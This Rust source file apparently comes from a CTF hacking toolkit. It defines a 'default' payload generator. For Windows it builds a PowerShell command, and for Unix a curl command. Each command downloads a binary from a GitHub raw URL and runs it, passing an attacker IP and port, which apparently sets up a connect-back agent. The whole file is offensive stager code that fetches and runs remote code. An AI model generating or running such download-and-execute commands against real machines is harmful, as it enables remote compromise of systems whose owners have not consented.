use crate::payloads::{Payload, Platform};

pub struct PayloadDefault;

impl Payload for PayloadDefault {
    fn name(&self) -> String {
        String::from("default")
    }

    fn description(&self) -> String {
        String::from("Generate a command to download and execute CTF-Tools.")
    }

    #[allow(unreachable_code)]
    fn generate(&self, ip: &str, port: &str, platform: Platform) -> Result<String, String> {
        match platform {
            Platform::Windows => {
                let github_raw_url =
                    "https://github.com/dd060606/CTF-Tools/raw/main/binaries/ctftools.exe";
                let command = format!(
                    r#"powershell -Command "Invoke-WebRequest -Uri '{}' -OutFile 'ctftools.exe' -FollowRelocation; Start-Process 'ctftools.exe' -ArgumentList '{}', '{}'""#,
                    github_raw_url, ip, port
                );
                Ok(command)
            }
            Platform::Unix => {
                let github_raw_url =
                    "https://github.com/dd060606/CTF-Tools/raw/main/binaries/ctftools";
                let command = format!(
                    r#"curl -L {} -o ctftools && chmod +x ctftools && ./ctftools {} {}"#,
                    github_raw_url, ip, port
                );
                Ok(command)
            }

            _ => Ok("".to_string()),
        }
    }
    fn platform(&self) -> Platform {
        Platform::All
    }
}
